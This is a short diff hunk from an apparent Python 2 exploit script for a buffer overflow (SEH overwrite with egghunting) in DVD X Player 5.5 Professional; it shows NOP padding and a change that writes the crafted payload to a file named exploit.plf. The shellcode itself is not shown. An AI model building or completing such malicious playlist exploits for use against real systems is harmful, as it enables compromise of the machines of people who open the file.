@@ -28,7 +28,7 @@ payload += "\x90" * 300 # Padding
 
 print "------DVD-X-Player-5.5-Professional-Buffer-Overflow-SEH+Egghunting------"
 try:
-    open("file.plf", "wb").write(payload+"\x00")
-
+    print "[+] Success attempt to write file: exploit.plf" 
+    open("exploit.plf", "wb").write(payload+"\x00")
 except Exception as e:
     print e
